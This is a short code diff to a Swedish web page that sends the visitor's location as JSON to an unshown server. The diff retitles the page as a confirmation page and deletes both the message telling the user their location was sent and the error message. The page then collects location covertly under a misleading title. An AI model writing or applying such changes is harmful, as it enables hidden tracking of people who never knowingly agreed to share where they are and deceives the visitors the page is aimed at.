@@ -2,7 +2,7 @@
 <html lang="sv">
 <head>
   <meta charset="UTF-8" />
-  <title>Location Share</title>
+  <title>Bekräfte</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
@@ -79,9 +79,9 @@
                 body: JSON.stringify(data)
               });
 
-              msgEl.innerHTML = `✅ Din plats har skickats! <br> <a href="${map}" target="_blank">Visa på Google Maps</a>`;
+              
             } catch (err) {
-              msgEl.innerText = '❌ Kunde inte skicka plats. Något gick fel.';
+             
               msgEl.classList.add('error');
               console.error(err);
             }
